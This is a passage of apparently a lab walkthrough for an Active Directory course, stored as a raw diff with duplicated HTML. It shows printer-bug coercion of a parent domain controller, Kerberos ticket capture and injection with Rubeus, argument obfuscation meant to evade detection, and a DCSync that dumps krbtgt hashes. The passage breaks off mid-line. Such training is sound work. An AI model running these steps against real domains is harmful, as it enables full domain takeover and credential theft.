+</p><p class="" id="30c79e9a-d7c9-8083-b9ec-dbb7410158a6">NOW, on out attacking machine let’s run MS-RPRN.exe to force running the Spooler service MDCORP-DC$ to DCORP-APPSRV$:</p><p class="" id="30c79e9a-d7c9-8082-ba30-cd510d26fa53"><code>C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</code></p><a href="../../assets/crtp/Untitled 101.png"><img src="../../assets/crtp/Untitled 101.png"/></a><p class="" id="30c79e9a-d7c9-8064-abac-ce7940d1c5ed">You may see the error above, but it’s ok. No Worries at all.</p><p class="" id="30c79e9a-d7c9-80dc-bb68-ffb47269850f">
+</p><p class="" id="30c79e9a-d7c9-80a4-bcb9-e433df911e56">We can check our listener again and we wil see that we have received a Base64 encoded Ticket for MCORP-DC$ which is the Domain Controller of moneycorp.local, which is dollarcorp.moneycorp.local Parent Domain.</p><a href="../../assets/crtp/Untitled 102.png"><img src="../../assets/crtp/Untitled 102.png"/></a><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8066-a77b-fc213d8abc70"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">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</code></pre><p class="" id="30c79e9a-d7c9-80fe-b530-c99e80008947">We should now  copy the base64 encoded ticket and use it with Rubeus on our attacking machine. <br/>Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process</p><p class="" id="30c79e9a-d7c9-80a8-a023-c5799249ad20">
+</p><p class="" id="30c79e9a-d7c9-80e7-bd03-c410516a1d16">Let’s copy the base64 encoded ticket and use it with Rubeus on our attacking machine. <br/>We run the below command from an elevated shell(Administrator) as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.</p><p class="" id="30c79e9a-d7c9-8034-be6c-d18fa06205b1">ArgSplit.bat</p><p class="" id="30c79e9a-d7c9-8021-a198-ef13af3ce446"><code>ptt</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80e8-a177-c66576bb904e"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">set "z=t"
+set "y=t"
+set "x=p"
+set "Pwn=%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-8014-ab30-f3e12ec06ac9">
+</p><p class="" id="30c79e9a-d7c9-8029-ad6c-ec1df38b456b">After passing the encoded work ptt into the cmdlet we can now execute the Rubeus using the Base64 encoded hash and the ticket will be imported</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80db-b953-d65826c87dc7"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket: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</code></pre><a href="../../assets/crtp/Untitled 103.png"><img src="../../assets/crtp/Untitled 103.png"/></a><p class="" id="30c79e9a-d7c9-8020-b268-d8e80cbb08d5">We can run klist command to confirm the Cached Ticket as MCORP-DC$.</p><p class="" id="30c79e9a-d7c9-804e-a74c-f0e531bd4d29"><code>klist</code></p><a href="../../assets/crtp/Untitled 104.png"><img src="../../assets/crtp/Untitled 104.png"/></a><p class="" id="30c79e9a-d7c9-8011-86c1-dbeaf0244d9b">
+</p><p class="" id="30c79e9a-d7c9-8019-a140-e051c13a4245">Now, we can run DCSync from this process.</p><p class="" id="30c79e9a-d7c9-807c-9265-f8d196a60bb3">Encoding our word with ArgSplit.bat again.<br/><code>lsadump::dcsync</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80e2-b436-e538f13eebe4"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">set "z=c"
+set "y=n"
+set "x=y"
+set "w=s"
+set "v=c"
+set "u=d"
+set "t=:"
+set "s=:"
+set "r=p"
+set "q=m"
+set "p=u"
+set "o=d"
+set "n=a"
+set "m=s"
+set "l=l"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-8039-8bdb-e37490406979">
+</p><p class="" id="30c79e9a-d7c9-80dd-9eb7-f1a3282c7010">Executing SafetyKatz for DCSync.</p><p class="" id="30c79e9a-d7c9-8074-8ffe-c95086fb4b6d"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:mcorp\krbtgt /domain:moneycorp.local" "exit”</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80ab-a00d-dbff9b4df3dd"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">mimikatz(commandline) # lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local
+[DC] 'moneycorp.local' will be the domain
+[DC] 'mcorp-dc.moneycorp.local' will be the DC server
+[DC] 'mcorp\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
-<span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">krbtgt</span>
-<span class="n">Account</span> <span class="nb">Type </span>        <span class="p">:</span> <span class="n">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
-<span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="n">00000202</span> <span class="p">(</span> <span class="n">ACCOUNTDISABLE</span> <span class="n">NORMAL_ACCOUNT</span> <span class="p">)</span>
-<span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span>
-<span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">11</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">41</span> <span class="n">PM</span>
-<span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">-</span><span class="n">502</span>
-<span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">502</span>
+Object RDN           : krbtgt
 
-<span class="n">Credentials</span><span class="p">:</span>
-  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">4e9815869d2090ccfca61c1fe0d23986</span>
-    <span class="n">ntlm</span><span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">4e9815869d2090ccfca61c1fe0d23986</span>
-    <span class="n">lm</span>  <span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">ea03581a1268674a828bde6ab09db837</span>
+** SAM ACCOUNT **
 
-<span class="n">Supplemental</span> <span class="n">Credentials</span><span class="p">:</span>
-<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">NTLM-Strong-NTOWF</span> <span class="p">*</span>
-    <span class="n">Random</span> <span class="n">Value</span> <span class="p">:</span> <span class="n">6d4cc4edd46d8c3d3e59250c91eac2bd</span>
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 10:46:24 PM
+Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
+Object Relative ID   : 502
 
-<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos-Newer-Keys</span> <span class="p">*</span>
-    <span class="k">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCALkrbtgt</span>
-    <span class="k">Default</span> <span class="n">Iterations</span> <span class="p">:</span> <span class="n">4096</span>
-    <span class="n">Credentials</span>
-      <span class="n">aes256_hmac</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span>
-      <span class="n">aes128_hmac</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">e74fa5a9aa05b2c0b2d196e226d8820e</span>
-      <span class="n">des_cbc_md5</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">150ea2e934ab6b80</span>
+Credentials:
+  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
+    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
+    lm  - 0: 87836055143ad5a507de2aaeb9000361
 
-<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos</span> <span class="p">*</span>
-    <span class="k">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCALkrbtgt</span>
-    <span class="n">Credentials</span>
-      <span class="n">des_cbc_md5</span>       <span class="p">:</span> <span class="n">150ea2e934ab6b80</span>
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 7c7a5135513110d108390ee6c322423f
 
-<span class="p">*</span> <span class="n">Packages</span> <span class="p">*</span>
-    <span class="n">NTLM-Strong-NTOWF</span>
-</code></pre></div>
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
+      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442
+      des_cbc_md5       (4096) : c20dc80d51f7abd9
 
-<h1>Escalation to Enterprise Admins</h1>
-<p>Assuming that we were able to compromise a Domain Controller, we are Domain Admin and we want to get Enterprise Admin privileges, we need to force authentication from mcorp-dc. 
-Run the below command to listen for MDCORP$ tickets on dcorp-appsrv</p>
-<p>Let’s access dcorp-appsrv.
-<code>winrs -r:dcorp-appsrv cmd</code></p>
-<p>Let’s do a portforwarding first</p>
-<p><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p>
-<p>NOW…We should not forget to encode the word “<code>monitor</code>” using ArgSplit.bat file and copy again to the cmdlet.</p>
-<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;z=r&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;y=o&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;x=t&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;w=i&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;v=n&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;u=o&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;t=m&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;Pwn=%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
+* Primary:Kerberos *
+    Default Salt : MONEYCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : c20dc80d51f7abd9
 
-<p><code>C:\Users\Public\Loader.exe -path ``http://127.0.0.1:8080/Rubeus.exe`` -args %Pwn% /targetuser:MCORP-DC$ /interval:5 /nowrap</code></p>
-<p>NOW, on out attacking machine let’s run MS-RPRN.exe to force running the Spooler service MDCORP-DC$ to DCORP-APPSRV$:</p>
-<p><code>C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</code></p>
-<p>You may see the error above, but it’s ok. No Worries at all.</p>
-<p>We can check our listener again and we wil see that we have received a Base64 encoded Ticket for MCORP-DC$ which is the Domain Controller of moneycorp.local, which is dollarcorp.moneycorp.local Parent Domain.</p>
-<div class="highlight"><pre><span></span><code><span class="n">doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPTU9ORVlDT1JQLkxPQ0FMo4IEgzCCBH</span><span class="p">+</span><span class="n">gAwIBEqEDAgECooIEcQSCBG3</span><span class="p">+</span><span class="n">MoVwQoITHDz7N0Q2FoAKHK1bBbByvY4eiuFAk0T4oUJK8tvjugIw9YqMK65wDHkCGpxtlK7B5qR43Ir647kv</span><span class="p">/</span><span class="n">Zv9ysyX3nMtLIYlKFJYuomU7GauBotBGyfxwRkhPvHQlrHXaSN6nm37eu1iwGDiKSm21GX4NYxki2OGDQhJ3yMfA6VbdWGc</span><span class="p">/</span><span class="n">PEgk57hXFJAra6rFelS2XRUS96eIJHqxsaKwJIg6G51UmZjdx0yLdc60momOT41</span><span class="p">+</span><span class="n">lqllcy1FXEWBxa1MMwez</span><span class="p">/</span><span class="n">zINa8</span><span class="p">/</span><span class="n">88pAYxWau1Dc3B9</span><span class="p">+</span><span class="n">yBAAa9YVvvpF0rrfVXC2Y4D3VHOMUIE2fR0qv9Ke7aE2aZ0EVDsADFoSB1hsR05hHzLy5XoSR6yFDMTX6piae4DOV6eTfc6EOzCJGqtWQ0l2rpRMJOrjLTOctzXh5SJlTC</span><span class="p">+</span><span class="n">ACj7m130EaABS5cyG8U5ygZsbL0b8H7yEqCvPD2EDU8e4XKFDNwNxfIl945LkBtNv38ZdmVtPWv0hXggzzXl</span><span class="p">+</span><span class="n">I8ci9JTfxzdk</span><span class="p">+</span><span class="n">N9</span><span class="p">+</span><span class="n">Zix7M</span><span class="p">/</span><span class="n">9BLlSAg7VcNhUZzvbkdt6LJ</span><span class="p">+</span><span class="n">o15P3hFaspjGDt8Eg</span><span class="p">+</span><span class="n">hXKChpN2U2bAvzEWnhGKjr1CpGYFHwh9Gm3bVO</span><span class="p">/</span><span class="n">FRTAz8zsvv0ktJV9d</span><span class="p">+</span><span class="n">gKV4RX</span><span class="p">//</span><span class="n">Inym70trywxxlV0EPzrzMPeOelaQzN6pgRpy3jF8Befwtz</span><span class="p">+</span><span class="n">e4</span><span class="p">/</span><span class="n">GwEfU2uAnq7KbRGg9G</span><span class="p">/</span><span class="n">fLkjw6u8RDi4tN9yI8M5dbaGcfndyANlfPj6it</span><span class="p">/</span><span class="n">xuQk4XT9mF</span><span class="p">/</span><span class="n">wsOErcuGCoGWY4yyOfyVsayy8cTlsZteX1YO7ZJaK0ifv8Sv9LGSZQHrHaWoJdOKQoB</span><span class="p">/</span><span class="n">3C2QNeM5wfi0U8M6lCL9ye0</span><span class="p">+</span><span class="n">ExctTN5</span><span class="p">/</span><span class="n">ffYhzZoVzGgQdc1WKHREFUcCFK5PsIInvlPPmldu62uZ4vYfDSVL3lYFJ6</span><span class="p">+</span><span class="n">UFc3PPV1unzcE9U4IVmemPAKseCJnCiR4LakbZVxTBadf</span><span class="p">+</span><span class="n">2CqapeTio7D7Sl9J0PsbPJTSrbYKt8M4UGuSB</span><span class="p">+</span><span class="n">OlfRR5LlqRFc604vJQi83qZ0qdrnQT2wCldMgxMKdvHHnixPNrxUQHaag</span><span class="p">/</span><span class="n">DmI</span><span class="p">+</span><span class="n">PA5vlDgvLLljGKLiPAygZEN1xXNjoKcXFsw3oCvSWOopPS6FEmSaldmQKa0yJGc7xj8t</span><span class="p">/</span><span class="n">4IOt</span><span class="p">+</span><span class="n">dHhcGIhGjDz052ZVhV9YpVH3LBmS3q7r7</span><span class="p">/</span><span class="n">cBCHnxP4keJkaNujG</span><span class="p">+</span><span class="n">bPZoj8zu1wWED5MZ6JScQ1f6W1UiymQOSQPYohWcJRtS7GuFY3i5UQ1OzbUIzyZ0aS2TXmIwS</span><span class="p">/</span><span class="n">bTEQCz82d39apU7e2bbeMUJEiJNzyrgCK3SLf50ZKTFChcEtaAnvdawBw</span><span class="p">/</span><span class="n">XXQwEWuj8CcfVCg249NzXcCc7WlfCLXrnz5tjABS4gE0YH</span><span class="p">/</span><span class="n">QNC8rhnk1qz3W3LIy</span><span class="p">/</span><span class="n">aTJrCxVLmsfVZrOv3AnBQYWdCeSWUS7FTkBvphScmFJEpS4r2hmghT3hpmRe3</span><span class="p">/</span><span class="n">0aaTIWXbvqy4dIO45ibo3f1ZpSopwKo8xmgvHUOyCsGNEIUT9DrY3FbpkJU4PhEFxgF6OB8DCB7aADAgEAooHlBIHifYHfMIHcoIHZMIHWMIHToCswKaADAgESoSIEIL1</span><span class="p">+</span><span class="n">0dX7BYd3I7HC167NXtwXBfilsB</span><span class="p">/+</span><span class="n">8xSMnP0Rz0MxoREbD01PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCU1DT1JQLURDJKMHAwUAYKEAAKURGA8yMDI0MDYxMDEzMzg1NVqmERgPMjAyNDA2MTAyMzM4NTVapxEYDzIwMjQwNjE3MDQwNjQwWqgRGw9NT05FWUNPUlAuTE9DQUypJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD01PTkVZQ09SUC5MT0NBTA</span><span class="p">==</span>
-</code></pre></div>
-
-<p>We should now  copy the base64 encoded ticket and use it with Rubeus on our attacking machine. 
-Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process</p>
-<p>Let’s copy the base64 encoded ticket and use it with Rubeus on our attacking machine. 
-We run the below command from an elevated shell(Administrator) as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.</p>
-<p>ArgSplit.bat</p>
-<p><code>ptt</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;z=t&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;y=t&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;x=p&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;Pwn=%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p>After passing the encoded work ptt into the cmdlet we can now execute the Rubeus using the Base64 encoded hash and the ticket will be imported</p>
-<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">AD</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">Loader</span><span class="p">.</span><span class="n">exe</span> <span class="n">-path</span> <span class="n">C</span><span class="p">:\</span><span class="n">AD</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">-args</span> <span class="k">%</span><span class="n">Pwn</span><span class="p">%</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPTU9ORVlDT1JQLkxPQ0FMo4IEgzCCBH</span><span class="p">+</span><span class="n">gAwIBEqEDAgECooIEcQSCBG3</span><span class="p">+</span><span class="n">MoVwQoITHDz7N0Q2FoAKHK1bBbByvY4eiuFAk0T4oUJK8tvjugIw9YqMK65wDHkCGpxtlK7B5qR43Ir647kv</span><span class="p">/</span><span class="n">Zv9ysyX3nMtLIYlKFJYuomU7GauBotBGyfxwRkhPvHQlrHXaSN6nm37eu1iwGDiKSm21GX4NYxki2OGDQhJ3yMfA6VbdWGc</span><span class="p">/</span><span class="n">PEgk57hXFJAra6rFelS2XRUS96eIJHqxsaKwJIg6G51UmZjdx0yLdc60momOT41</span><span class="p">+</span><span class="n">lqllcy1FXEWBxa1MMwez</span><span class="p">/</span><span class="n">zINa8</span><span class="p">/</span><span class="n">88pAYxWau1Dc3B9</span><span class="p">+</span><span class="n">yBAAa9YVvvpF0rrfVXC2Y4D3VHOMUIE2fR0qv9Ke7aE2aZ0EVDsADFoSB1hsR05hHzLy5XoSR6yFDMTX6piae4DOV6eTfc6EOzCJGqtWQ0l2rpRMJOrjLTOctzXh5SJlTC</span><span class="p">+</span><span class="n">ACj7m130EaABS5cyG8U5ygZsbL0b8H7yEqCvPD2EDU8e4XKFDNwNxfIl945LkBtNv38ZdmVtPWv0hXggzzXl</span><span class="p">+</span><span class="n">I8ci9JTfxzdk</span><span class="p">+</span><span class="n">N9</span><span class="p">+</span><span class="n">Zix7M</span><span class="p">/</span><span class="n">9BLlSAg7VcNhUZzvbkdt6LJ</span><span class="p">+</span><span class="n">o15P3hFaspjGDt8Eg</span><span class="p">+</span><span 